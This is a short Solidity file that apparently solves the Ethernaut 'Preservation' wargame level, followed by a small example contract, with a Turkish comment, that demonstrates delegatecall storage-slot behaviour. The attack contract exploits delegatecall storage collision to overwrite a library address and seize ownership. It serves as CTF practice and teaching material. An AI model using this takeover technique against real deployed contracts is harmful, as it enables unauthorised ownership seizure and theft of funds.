// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

interface IPreservation {
    function setFirstTime(uint256) external;
}

contract presevationAttack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function attack(IPreservation target) external {
        target.setFirstTime(uint256(uint160(address(this))));

        target.setFirstTime(uint256(uint160(msg.sender)));
    }

    function setTime(uint256 _owner) public {
        owner = address(uint160(_owner));
    }
}

// Delegatecall fonksiyonunu daha iyi anlamak için kullandığım örnek =)

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract B {
    uint public num;
    address public sender;
    uint public value;

    function setVars(uint _num) public payable {
        num = _num;
    }
}

contract A {
    uint public slot0;
    address public slot1;
    uint public slot2;

    function setVars(address _contract, uint _num) public payable {
        (bool success, bytes memory data) = _contract.delegatecall(
            abi.encodeWithSignature("setVars(uint256)", _num)
        );
    }
}
